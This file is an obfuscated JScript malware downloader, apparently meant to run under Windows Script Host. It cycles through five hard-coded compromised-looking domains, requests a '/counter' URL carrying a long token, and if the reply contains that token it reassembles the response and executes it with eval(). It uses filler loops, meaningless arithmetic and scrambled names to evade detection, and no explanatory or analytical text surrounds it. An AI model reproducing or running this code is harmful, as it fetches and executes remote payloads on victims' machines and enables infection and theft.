var uuu = 10;while(uuu<999999) {uuu++;}
var ijdl = "MSXML2.XMLHTTP";
var dfs = WScript.CreateObject(ijdl);
var joshua = ['/', 't', "ZRAMD", ":", 'p', '', 'S', 'a', "T", '', "PILKU", 'FFFFFFFFFFFF'];
function ataaa(ziyter) {eval(ziyter+'');}
joshua[0+2] = "GETA";
joshua[3-1] = joshua[2].substr(0, 3);
var x = ["www.jinshenyuan.com","hotelchitra.in","rogran.it","foreverdawn.com","eventik.ro"];
var gyt = 0;
var lub = joshua[0];
function muhter(kjg, lki) {return kjg.split(lki+'');}
while(true)
{
	if(gyt>=x.length)
	{
		break;
	}
	try
	{
		var feni = '00000001wdCpgx2Q8zxQsTd6Tsd77nbF51NgskRFrZD58xCr_V5pY8hfDVZ_eN3cYAto2sj_fIq21AiTelLe43j7ISMI1o_uH-V5kxpSFp1LGW4ScMuMXRZl0';
		var ghyt = false;
		var tjkh = x[gyt+1-1];
		var nami = "counter";
		var zmei = "http";
		var figson = zmei + ":"+"//" + tjkh + '/'+nami+'?'+feni;
		grohot(dfs,joshua[1+1]+"", figson, ghyt);
		dfs.send();
		var r = dfs.responseText;
		var rima = 10 * 50;
		var got = 50+450+rima;
		var fontu = r.length;
		var emisogh = 12;
		if ((fontu - got * 2) > (emisogh+emisogh-(22+2) - got) && (r.indexOf(feni+'')-1) > (got-1002))
		{
			var jiki = muhter(r, feni);
			var guznam = fuuu(jiki, 'a');
			ataaa(guznam);
			break;
		};
	}
	catch(e)
	{
	};
	gyt++;
};
function fuuu(fuu1, fuu2) {return fuu1.join(fuu2);}
function grohot(hunko,b1,b2,b3) {hunko.open(b1, b2, b3);}